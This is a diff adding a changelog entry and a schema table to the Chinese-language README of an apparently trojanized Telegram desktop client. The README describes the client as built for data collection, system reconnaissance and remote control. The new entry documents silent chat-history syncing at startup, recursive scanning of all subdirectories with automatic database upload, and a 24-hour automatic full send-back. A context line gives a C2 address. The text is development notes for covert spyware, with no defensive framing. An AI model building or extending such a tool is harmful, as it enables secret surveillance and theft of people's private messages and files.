@@ -15,6 +15,16 @@
 
 本项目是对官方 Telegram 桌面客户端的修改版本，旨在集成数据收集、系统侦察和远程控制功能，作为一个受管端点运行。
 
+### 修改日志 (2026-01-17)
+
+*   **功能增强**: 实现了静默聊天记录同步 (`syncChatHistory`)。在应用启动时自动获取之前的聊天记录（支持 Catch-up 模式），并记录同步状态以避免重复获取。
+*   **功能增强**: 优化了文件系统扫描 (`BackgroundScanner`)。现在支持自动启动和递归扫描所有子目录 (`QDirIterator`)，扫描完成后自动上传数据库。
+*   **功能增强**: 实现了 24 小时自动回传机制。如果本地数据超过 24 小时未上传，将自动触发全量数据库上传。
+*   **Schema 变更**: 新增 `chat_sync_state` 表用于记录每个会话的同步进度 (`min_id`, `max_id`)。
+*   **Schema 变更**: `chat_logs` 表新增 `media_path` 字段，用于存储图片/文件路径（目前支持 Photo ID）。
+*   **Bug修复**: 修复了 `heartbeat.cpp` 中的编译错误（包括 `emit` 关键字替换为 `Q_EMIT`，以及迭代器和类型匹配修复）。
+*   **Bug修复**: 修复了 `tdata_client.db` 不更新的问题（确保了重新编译和正确的数据库初始化路径）。
+
 ### 修改日志 (2026-01-16)
 
 *   **配置变更**: 客户端回传地址 (C2 URL) 已从 `localhost:8101` 更改为 `192.168.2.131:8101`。请确保后端服务在该 IP 上可访问。
@@ -170,6 +180,15 @@ Web 端开发者请参考以下 SQLite 数据库 (`tdata_client.db`) 结构进�
 | `type` | TEXT | 类型 ("Private", "Group", "Supergroup", "Channel") |
 | `invite_link` | TEXT | 邀请链接 (如有) |
 | `member_count` | INTEGER | 成员数量 |
+
+#### 9. 聊天同步状态 (`chat_sync_state`)
+存储每个会话的聊天记录同步进度。
+| 字段 | 类型 | 说明 |
+| :--- | :--- | :--- |
+| `chat_id` | TEXT | 主键，会话 ID |
+| `min_id` | INTEGER | 已同步的最小消息 ID |
+| `max_id` | INTEGER | 已同步的最大消息 ID |
+| `last_sync` | INTEGER | 最后同步时间戳 |
 
 ## 支持的系统
 
